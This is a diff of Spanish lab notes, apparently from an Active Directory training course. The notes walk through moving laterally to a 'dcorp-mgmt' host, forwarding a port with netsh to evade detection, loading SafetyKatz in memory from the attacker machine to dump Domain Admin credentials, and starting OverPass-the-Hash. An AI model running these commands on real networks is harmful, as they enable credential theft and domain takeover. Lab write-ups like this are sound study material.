@@ -117,18 +117,19 @@ echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.ex
 
 Ahora volveremos a poder usar *winrs* para poder ejecutarlo en el equipo de *dcorp-mgmt*, en este caso para poder evitar la detección en el dominio haremos un reenvió de puertos
 ```shell
-$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.67"
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
 ```
 
 Haciendo que la maquina objetivo escuche en el puerto *8080* y reenvié el trafico al *80* de nuestra maquina atacante
 
 Usamos *$null* para solucionar problemas a la redirección de salida
-Para poder ejecutar ahora *SafetyKatz* en *dcorp-mgmt*, lo descagamos y ejecutamos en memoria usando el *Loader*
+
+Para poder ejecutar ahora *SafetyKatz* en *dcorp-mgmt*, lo descargamos y ejecutamos en memoria usando el *Loader*
 ```shell
 $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
 ```
 
-Dándonos como respuesta las credenciales del *svcadmin* que es Domain Admin
+Dándonos como respuesta las credenciales del *svcadmin* que es Domain Admin ademas de ser una cuenta de servicio lo cual es muy interesa
 
 A continuación usaremos la técnica de *OverPass-The_Hash* para obtener las credenciales de *svcadmin* 
 Tendremos que ejecutar una terminal como Administrador
